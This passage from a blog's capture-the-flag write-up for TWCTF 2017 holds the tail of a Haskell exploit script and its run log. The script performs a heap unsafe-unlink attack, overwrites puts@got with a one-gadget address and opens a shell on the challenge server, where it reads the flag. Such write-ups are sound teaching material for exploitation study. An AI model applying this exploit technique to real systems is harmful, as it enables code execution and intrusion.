<span id="cb6-82"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-82" aria-hidden="true" tabindex="-1"></a>  <span class="kw">let</span> <span class="dt">Just</span> heap_base&#39;     <span class="ot">=</span> u64 <span class="op">$</span> leak1 <span class="op">&lt;&gt;</span> BS.replicate (<span class="dv">8</span> <span class="op">-</span> BS.length leak1) <span class="ch">&#39;\x00&#39;</span></span>
<span id="cb6-83"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-83" aria-hidden="true" tabindex="-1"></a>      <span class="dt">Just</span> main_arena_top <span class="ot">=</span> u64 <span class="op">$</span> leak2 <span class="op">&lt;&gt;</span> BS.replicate (<span class="dv">8</span> <span class="op">-</span> BS.length leak2) <span class="ch">&#39;\x00&#39;</span></span>
<span id="cb6-84"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-84" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-85"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-85" aria-hidden="true" tabindex="-1"></a>      heap_base   <span class="ot">=</span> heap_base&#39; <span class="op">.&amp;.</span> complement <span class="bn">0xff</span></span>
<span id="cb6-86"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-86" aria-hidden="true" tabindex="-1"></a>      main_arena  <span class="ot">=</span> main_arena_top <span class="op">-</span> <span class="bn">0x58</span></span>
<span id="cb6-87"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-87" aria-hidden="true" tabindex="-1"></a>      libc_base   <span class="ot">=</span> main_arena <span class="op">-</span> libc_main_arena&#39;</span>
<span id="cb6-88"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-88" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-89"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-89" aria-hidden="true" tabindex="-1"></a>  success <span class="op">$</span> <span class="st">&quot;  heap_base:  0x&quot;</span> <span class="op">&lt;&gt;</span> showHex heap_base <span class="st">&quot;&quot;</span></span>
<span id="cb6-90"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-90" aria-hidden="true" tabindex="-1"></a>  success <span class="op">$</span> <span class="st">&quot;  main_arena: 0x&quot;</span> <span class="op">&lt;&gt;</span> showHex main_arena <span class="st">&quot;&quot;</span></span>
<span id="cb6-91"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-91" aria-hidden="true" tabindex="-1"></a>  success <span class="op">$</span> <span class="st">&quot;  libc_base:  0x&quot;</span> <span class="op">&lt;&gt;</span> showHex libc_base <span class="st">&quot;&quot;</span></span>
<span id="cb6-92"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-92" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-93"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-93" aria-hidden="true" tabindex="-1"></a>  <span class="co">-------------------------------------------------------------------</span></span>
<span id="cb6-94"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-94" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-95"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-95" aria-hidden="true" tabindex="-1"></a>  info <span class="st">&quot;allocate [0x88, 0xf8, 0x88, 0x88] bytes buffer (buffer 4..7)&quot;</span></span>
<span id="cb6-96"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-96" aria-hidden="true" tabindex="-1"></a>  forM_ [<span class="bn">0x88</span>, <span class="bn">0xf8</span>, <span class="bn">0x88</span>, <span class="bn">0x88</span>] <span class="op">$</span> \size <span class="ot">-&gt;</span> addNote size <span class="op">$</span> BS.replicate size <span class="ch">&#39;A&#39;</span></span>
<span id="cb6-97"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-97" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-98"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-98" aria-hidden="true" tabindex="-1"></a>  info <span class="st">&quot;free buffer 5&quot;</span></span>
<span id="cb6-99"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-99" aria-hidden="true" tabindex="-1"></a>  deleteNote <span class="dv">5</span></span>
<span id="cb6-100"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-100" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-101"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-101" aria-hidden="true" tabindex="-1"></a>  info <span class="st">&quot;overwrite chunk 5&#39;s size&quot;</span></span>
<span id="cb6-102"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-102" aria-hidden="true" tabindex="-1"></a>  editNote <span class="dv">4</span> <span class="op">$</span> BS.replicate <span class="bn">0x88</span> <span class="ch">&#39;c&#39;</span> <span class="op">&lt;&gt;</span> <span class="st">&quot;\xf1&quot;</span></span>
<span id="cb6-103"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-103" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-104"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-104" aria-hidden="true" tabindex="-1"></a>  info <span class="st">&quot;write fake prev_size via buffer 7&quot;</span></span>
<span id="cb6-105"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-105" aria-hidden="true" tabindex="-1"></a>  <span class="kw">let</span> buf <span class="ot">=</span> BS.concat <span class="op">$</span> catMaybes</span>
<span id="cb6-106"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-106" aria-hidden="true" tabindex="-1"></a>            [ <span class="dt">Just</span> <span class="op">$</span> BS.replicate <span class="bn">0x50</span> <span class="ch">&#39;d&#39;</span></span>
<span id="cb6-107"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-107" aria-hidden="true" tabindex="-1"></a>            , p64 <span class="bn">0x1f0</span></span>
<span id="cb6-108"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-108" aria-hidden="true" tabindex="-1"></a>            ]</span>
<span id="cb6-109"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-109" aria-hidden="true" tabindex="-1"></a>  editNote <span class="dv">7</span> buf</span>
<span id="cb6-110"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-110" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-111"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-111" aria-hidden="true" tabindex="-1"></a>  info <span class="st">&quot;allocate [0x108, 0x88] bytes buffer (buffer 5, buffer 8)&quot;</span></span>
<span id="cb6-112"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-112" aria-hidden="true" tabindex="-1"></a>  forM_ [<span class="bn">0x108</span>, <span class="bn">0x88</span>] <span class="op">$</span> \size <span class="ot">-&gt;</span> addNote size <span class="op">$</span> BS.replicate size <span class="ch">&#39;A&#39;</span></span>
<span id="cb6-113"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-113" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-114"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-114" aria-hidden="true" tabindex="-1"></a>  info <span class="st">&quot;set chunk 8&#39;s fd and bk, clear prev_inuse flag&quot;</span></span>
<span id="cb6-115"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-115" aria-hidden="true" tabindex="-1"></a>  <span class="kw">let</span> buf <span class="ot">=</span> BS.concat <span class="op">$</span> catMaybes</span>
<span id="cb6-116"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-116" aria-hidden="true" tabindex="-1"></a>            [ p64 <span class="op">$</span> list <span class="op">+</span> <span class="bn">0x18</span>   <span class="co">-- fd</span></span>
<span id="cb6-117"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-117" aria-hidden="true" tabindex="-1"></a>            , p64 <span class="op">$</span> list <span class="op">+</span> <span class="bn">0x20</span>   <span class="co">-- bk</span></span>
<span id="cb6-118"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-118" aria-hidden="true" tabindex="-1"></a>            , <span class="dt">Just</span> <span class="op">$</span> BS.replicate <span class="bn">0x70</span> <span class="ch">&#39;d&#39;</span></span>
<span id="cb6-119"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-119" aria-hidden="true" tabindex="-1"></a>            , p64 <span class="bn">0x90</span>            <span class="co">-- prev_size</span></span>
<span id="cb6-120"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-120" aria-hidden="true" tabindex="-1"></a>            , <span class="dt">Just</span> <span class="st">&quot;\x50&quot;</span>         <span class="co">-- size</span></span>
<span id="cb6-121"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-121" aria-hidden="true" tabindex="-1"></a>            ]</span>
<span id="cb6-122"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-122" aria-hidden="true" tabindex="-1"></a>  editNote <span class="dv">8</span> buf</span>
<span id="cb6-123"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-123" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-124"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-124" aria-hidden="true" tabindex="-1"></a>  info <span class="st">&quot;free buffer 5 (unsafe unlink attack!)&quot;</span></span>
<span id="cb6-125"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-125" aria-hidden="true" tabindex="-1"></a>  deleteNote <span class="dv">5</span></span>
<span id="cb6-126"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-126" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-127"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-127" aria-hidden="true" tabindex="-1"></a>  <span class="co">-- 1: x/16xg 0x006020c0</span></span>
<span id="cb6-128"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-128" aria-hidden="true" tabindex="-1"></a>  <span class="co">-- 0x6020c0 &lt;list&gt;:        0x0000000000b83130      0x0000000000b830a0</span></span>
<span id="cb6-129"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-129" aria-hidden="true" tabindex="-1"></a>  <span class="co">-- 0x6020d0 &lt;list+16&gt;:     0x0000000000b83010      0x0000000000b831c0</span></span>
<span id="cb6-130"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-130" aria-hidden="true" tabindex="-1"></a>  <span class="co">-- 0x6020e0 &lt;list+32&gt;:     0x0000000000b83250      0x0000000000000000</span></span>
<span id="cb6-131"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-131" aria-hidden="true" tabindex="-1"></a>  <span class="co">-- 0x6020f0 &lt;list+48&gt;:     0x00000000006020d8      0x0000000000b833f0</span></span>
<span id="cb6-132"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-132" aria-hidden="true" tabindex="-1"></a>  <span class="co">-- 0x602100 &lt;list+64&gt;:     0x0000000000000000      0x0000000000000000</span></span>
<span id="cb6-133"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-133" aria-hidden="true" tabindex="-1"></a>  <span class="co">-- 0x602110 &lt;list+80&gt;:     0x0000000000000000      0x0000000000000000</span></span>
<span id="cb6-134"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-134" aria-hidden="true" tabindex="-1"></a>  <span class="co">-- 0x602120 &lt;list+96&gt;:     0x0000000000000000      0x0000000000000000</span></span>
<span id="cb6-135"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-135" aria-hidden="true" tabindex="-1"></a>  <span class="co">-- 0x602130 &lt;list+112&gt;:    0x0000000000000000      0x0000000000000000</span></span>
<span id="cb6-136"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-136" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-137"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-137" aria-hidden="true" tabindex="-1"></a>  info <span class="st">&quot;overwrite list[3] to puts@got via buffer 6&quot;</span></span>
<span id="cb6-138"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-138" aria-hidden="true" tabindex="-1"></a>  <span class="kw">let</span> heap_addr_len <span class="ot">=</span> BS.length leak1</span>
<span id="cb6-139"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-139" aria-hidden="true" tabindex="-1"></a>      libc_addr_len <span class="ot">=</span> BS.length leak2</span>
<span id="cb6-140"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-140" aria-hidden="true" tabindex="-1"></a>  editNote <span class="dv">6</span> <span class="op">$</span> BS.take heap_addr_len <span class="op">$</span> fromJust <span class="op">$</span> p64 puts_got</span>
<span id="cb6-141"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-141" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-142"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-142" aria-hidden="true" tabindex="-1"></a>  info <span class="st">&quot;overwrite puts@got to one-gadget-RCE via buffer 3&quot;</span></span>
<span id="cb6-143"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-143" aria-hidden="true" tabindex="-1"></a>  editNote <span class="dv">3</span> <span class="op">$</span> BS.take libc_addr_len <span class="op">$</span> fromJust <span class="op">$</span> p64 <span class="op">$</span> libc_base <span class="op">+</span> libc_one_gadget&#39;</span>
<span id="cb6-144"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-144" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-145"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-145" aria-hidden="true" tabindex="-1"></a>  interactive r</span></code></pre></div>
<pre><code>$ ./exploit.hs
[x] Opening connection to pwn1.chal.ctf.westerns.tokyo on port 16317
[+] Opening connection to pwn1.chal.ctf.westerns.tokyo on port 16317: Done
[*] allocate 0x88 bytes buffer x4 (buffer 0..3)
[*] free buffer 2 and buffer 0
[*] allocate 0x88 bytes buffer x2 (buffer 0, buffer 2)
[*] leak informations
[+]   heap_base:  0x1181000
[+]   main_arena: 0x7fd044fcfb20
[+]   libc_base:  0x7fd044c0b000
[*] allocate [0x88, 0xf8, 0x88, 0x88] bytes buffer (buffer 4..7)
[*] free buffer 5
[*] overwrite chunk 5&#39;s size
[*] write fake prev_size via buffer 7
[*] allocate [0x108, 0x88] bytes buffer (buffer 5, buffer 8)
[*] set chunk 8&#39;s fd and bk, clear prev_inuse flag
[*] free buffer 5 (unsafe unlink attack!)
[*] overwrite list[3] to puts@got via buffer 6
[*] overwrite puts@got to one-gadget-RCE via buffer 3
[*] Entering interactive mode
id
uid=16317069 gid=16317(p16317) groups=16317(p16317)
ls
flag
launch.sh
simple_note
cat flag
TWCTF{unl1nk_4774ck_15_u53fu1_73chn1qu3}
[*] Leaving interactive mode</code></pre>
<section class="footnotes footnotes-end-of-document" role="doc-endnotes">
<hr />
<ol>
<li id="fn1" role="doc-endnote"><p>値は x86-64 の場合<a href="/entry/2017/09/04/twctf-2017-writeups/#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
</ol>
</section></div><aside class="comments"><div id="disqus_thread"></div><script>(function() { var d = document, s = d.createElement('script');s.src = 'https://tosainu.disqus.com/embed.js';s.setAttribute('data-timestamp', +new Date());(d.head || d.body).appendChild(s); })();</script><noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" target="_blank" rel="nofollow noopener">comments powered by Disqus.</a></noscript></aside></div></article></main><footer class="site-footer"><div class="footer-widgets"><div class="container"><div class="col"><section class="about-me"><h4><svg class="svg-inline--fa fa-user fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 448 512" data-icon="user" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M224 256c70.7 0 128-57.3 128-128S294.7 0 224 0S96 57.3 96 128s57.3 128 128 128zm-45.7 48C79.8 304 0 383.8 0 482.3C0 498.7 13.3 512 29.7 512H418.3c16.4 0 29.7-13.3 29.7-29.7C448 383.8 368.2 304 269.7 304H178.3z" fill="currentColor"></path></svg> About Me</h4><div class="about"><div class="avatar"><img src="/images/icon/cocoa.svg" class="icon" alt="avatar"></div><div class="info"><div class="name"><a href="https://myon.info" target="_blank" rel="nofollow noopener">Tosainu</a></div><div class="info">❤ Arch Linux, ごちうさ</div></div></div></section><section class="recent-posts"><h4><svg class="svg-inline--fa fa-file fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 384 512" data-icon="file" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M0 64C0 28.7 28.7 0 64 0H224V128c0 17.7 14.3 32 32 32H384V448c0 35.3-28.7 64-64 64H64c-35.3 0-64-28.7-64-64V64zm384 64H256V0L384 128z" fill="currentColor"></path></svg> Recent Posts</h4><ul><li><a href="/entry/2022/09/19/earthly-zynqmp/">とにかく複雑な Zynq のソフトウェアを Earthly でビルドする</a></li><li><a href="/entry/2020/11/29/archlinux-arm-on-zu/">Ultra96 で Arch Linux ARM を動かす</a></li><li><a href="/entry/2020/09/01/thinkpad-x13/">ThinkPad X13 を買いました</a></li><li><a href="/entry/2020/07/05/bus-blaster/">Bus Blaster で Raspberry Pi Model B を JTAG デバッグしてみる</a></li><li><a href="/entry/2019/10/21/make-own-language-and-compiler/">Brainf**k からはじめる自作コンパイラ</a></li></ul></section></div><section class="tag-cloud"><h4><svg class="svg-inline--fa fa-tags fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 512 512" data-icon="tags" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M345 39.1L472.8 168.4c52.4 53 52.4 138.2 0 191.2L360.8 472.9c-9.3 9.4-24.5 9.5-33.9 .2s-9.5-24.5-.2-33.9L438.6 325.9c33.9-34.3 33.9-89.4 0-123.7L310.9 72.9c-9.3-9.4-9.2-24.6 .2-33.9s24.6-9.2 33.9 .2zM0 229.5V80C0 53.5 21.5 32 48 32H197.5c17 0 33.3 6.7 45.3 18.7l168 168c25 25 25 65.5 0 90.5L277.3 442.7c-25 25-65.5 25-90.5 0l-168-168C6.7 262.7 0 246.5 0 229.5zM144 144c0-17.7-14.3-32-32-32s-32 14.3-32 32s14.3 32 32 32s32-14.3 32-32z" fill="currentColor"></path></svg> Tags</h4><ul class="tag-list"><li><a href="/entry/tags/android/"><span>Android</span></a></li><li><a href="/entry/tags/arch-linux/"><span>Arch Linux</span></a></li><li><a href="/entry/tags/arduino/"><span>Arduino</span></a></li><li><a href="/entry/tags/c/"><span>C++</span></a></li><li><a href="/entry/tags/ctf/"><span>CTF</span></a></li><li><a href="/entry/tags/diy-pc/"><span>DIY PC</span></a></li><li><a href="/entry/tags/docker/"><span>Docker</span></a></li><li><a href="/entry/tags/fpga/"><span>FPGA</span></a></li><li><a href="/entry/tags/game/"><span>Game</span></a></li><li><a href="/entry/tags/gochiusa/"><span>Gochiusa</span></a></li><li><a href="/entry/tags/hakyll/"><span>Hakyll</span></a></li><li><a href="/entry/tags/haskell/"><span>Haskell</span></a></li><li><a href="/entry/tags/linux/"><span>Linux</span></a></li><li><a href="/entry/tags/machine-learning/"><span>Machine learning</span></a></li><li><a href="/entry/tags/network/"><span>Network</span></a></li><li><a href="/entry/tags/raspberry-pi/"><span>Raspberry Pi</span></a></li><li><a href="/entry/tags/rust/"><span>Rust</span></a></li><li><a href="/entry/tags/slack/"><span>Slack</span></a></li><li><a href="/entry/tags/thinkpad-x13/"><span>ThinkPad X13</span></a></li><li><a href="/entry/tags/vaio-z2/"><span>VAIO Z2</span></a></li><li><a href="/entry/tags/vim/"><span>Vim</span></a></li><li><a href="/entry/tags/walkmanz/"><span>WalkmanZ</span></a></li><li><a href="/entry/tags/website/"><span>Website</span></a></li><li><a href="/entry/tags/xperia-nx/"><span>Xperia NX</span></a></li><li><a href="/entry/tags/xperia-arc/"><span>Xperia arc</span></a></li><li><a href="/entry/tags/xperia2011/"><span>Xperia2011</span></a></li><li><a href="/entry/tags/seccamp/"><span>seccamp</span></a></li></ul></section><section class="archives"><h4><svg class="svg-inline--fa fa-box-archive fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 512 512" data-icon="box-archive" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M32 32H480c17.7 0 32 14.3 32 32V96c0 17.7-14.3 32-32 32H32C14.3 128 0 113.7 0 96V64C0 46.3 14.3 32 32 32zm0 128H480V416c0 35.3-28.7 64-64 64H96c-35.3 0-64-28.7-64-64V160zm128 80c0 8.8 7.2 16 16 16H336c8.8 0 16-7.2 16-16s-7.2-16-16-16H176c-8.8 0-16 7.2-16 16z" fill="currentColor"></path></svg> Archives</h4><ul class="archive-tree"><li><input class="tree-toggle" type="checkbox" id="tree-label-2022"><label class="tree-toggle-button" for="tree-label-2022"><svg class="svg-inline--fa fa-angle-right fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 320 512" data-icon="angle-right" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z" fill="currentColor"></path></svg><svg class="svg-inline--fa fa-angle-down fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 448 512" data-icon="angle-down" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M201.4 374.6c12.5 12.5 32.8 12.5 45.3 0l160-160c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L224 306.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l160 160z" fill="currentColor"></path></svg><a href="/entry/2022/">2022 (1)</a></label><ul class="tree-child"><li><a href="/entry/2022/09/">2022/09 (1)</a></li></ul></li><li><input class="tree-toggle" type="checkbox" id="tree-label-2020"><label class="tree-toggle-button" for="tree-label-2020"><svg class="svg-inline--fa fa-angle-right fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 320 512" data-icon="angle-right" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z" fill="currentColor"></path></svg><svg class="svg-inline--fa fa-angle-down fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 448 512" data-icon="angle-down" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M201.4 374.6c12.5 12.5 32.8 12.5 45.3 0l160-160c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L224 306.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l160 160z" fill="currentColor"></path></svg><a href="/entry/2020/">2020 (3)</a></label><ul class="tree-child"><li><a href="/entry/2020/11/">2020/11 (1)</a></li><li><a href="/entry/2020/09/">2020/09 (1)</a></li><li><a href="/entry/2020/07/">2020/07 (1)</a></li></ul></li><li><input class="tree-toggle" type="checkbox" id="tree-label-2019"><label class="tree-toggle-button" for="tree-label-2019"><svg class="svg-inline--fa fa-angle-right fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 320 512" data-icon="angle-right" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z" fill="currentColor"></path></svg><svg class="svg-inline--fa fa-angle-down fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 448 512" data-icon="angle-down" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M201.4 374.6c12.5 12.5 32.8 12.5 45.3 0l160-160c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L224 306.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l160 160z" fill="currentColor"></path></svg><a href="/entry/2019/">2019 (4)</a></label><ul class="tree-child"><li><a href="/entry/2019/10/">2019/10 (1)</a></li><li><a href="/entry/2019/08/">2019/08 (2)</a></li><li><a href="/entry/2019/05/">2019/05 (1)</a></li></ul></li><li><input class="tree-toggle" type="checkbox" id="tree-label-2018"><label class="tree-toggle-button" for="tree-label-2018"><svg class="svg-inline--fa fa-angle-right fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 320 512" data-icon="angle-right" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z" fill="currentColor"></path></svg><svg class="svg-inline--fa fa-angle-down fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 448 512" data-icon="angle-down" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M201.4 374.6c12.5 12.5 32.8 12.5 45.3 0l160-160c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L224 306.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l160 160z" fill="currentColor"></path></svg><a href="/entry/2018/">2018 (5)</a></label><ul class="tree-child"><li><a href="/entry/2018/10/">2018/10 (1)</a></li><li><a href="/entry/2018/09/">2018/09 (1)</a></li><li><a href="/entry/2018/08/">2018/08 (1)</a></li><li><a href="/entry/2018/03/">2018/03 (1)</a></li><li><a href="/entry/2018/01/">2018/01 (1)</a></li></ul></li><li><input class="tree-toggle" type="checkbox" id="tree-label-2017" checked><label class="tree-toggle-button" for="tree-label-2017"><svg class="svg-inline--fa fa-angle-right fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 320 512" data-icon="angle-right" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z" fill="currentColor"></path></svg><svg class="svg-inline--fa fa-angle-down fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 448 512" data-icon="angle-down" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M201.4 374.6c12.5 12.5 32.8 12.5 45.3 0l160-160c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L224 306.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l160 160z" fill="currentColor"></path></svg><a href="/entry/2017/">2017 (5)</a></label><ul class="tree-child"><li><a href="/entry/2017/09/">2017/09 (1)</a></li><li><a href="/entry/2017/05/">2017/05 (1)</a></li><li><a href="/entry/2017/02/">2017/02 (3)</a></li></ul></li><li><input class="tree-toggle" type="checkbox" id="tree-label-2016"><label class="tree-toggle-button" for="tree-label-2016"><svg class="svg-inline--fa fa-angle-right fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 320 512" data-icon="angle-right" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z" fill="currentColor"></path></svg><svg class="svg-inline--fa fa-angle-down fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 448 512" data-icon="angle-down" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M201.4 374.6c12.5 12.5 32.8 12.5 45.3 0l160-160c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L224 306.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l160 160z" fill="currentColor"></path></svg><a href="/entry/2016/">2016 (8)</a></label><ul class="tree-child"><li><a href="/entry/2016/08/">2016/08 (2)</a></li><li><a href="/entry/2016/07/">2016/07 (1)</a></li><li><a href="/entry/2016/06/">2016/06 (1)</a></li><li><a href="/entry/2016/05/">2016/05 (1)</a></li><li><a href="/entry/2016/03/">2016/03 (1)</a></li><li><a href="/entry/2016/01/">2016/01 (2)</a></li></ul></li><li><input class="tree-toggle" type="checkbox" id="tree-label-2015"><label class="tree-toggle-button" for="tree-label-2015"><svg class="svg-inline--fa fa-angle-right fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 320 512" data-icon="angle-right" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z" fill="currentColor"></path></svg><svg class="svg-inline--fa fa-angle-down fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 448 512" data-icon="angle-down" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M201.4 374.6c12.5 12.5 32.8 12.5 45.3 0l160-160c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L224 306.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l160 160z" fill="currentColor"></path></svg><a href="/entry/2015/">2015 (12)</a></label><ul class="tree-child"><li><a href="/entry/2015/12/">2015/12 (1)</a></li><li><a href="/entry/2015/08/">2015/08 (1)</a></li><li><a href="/entry/2015/06/">2015/06 (2)</a></li><li><a 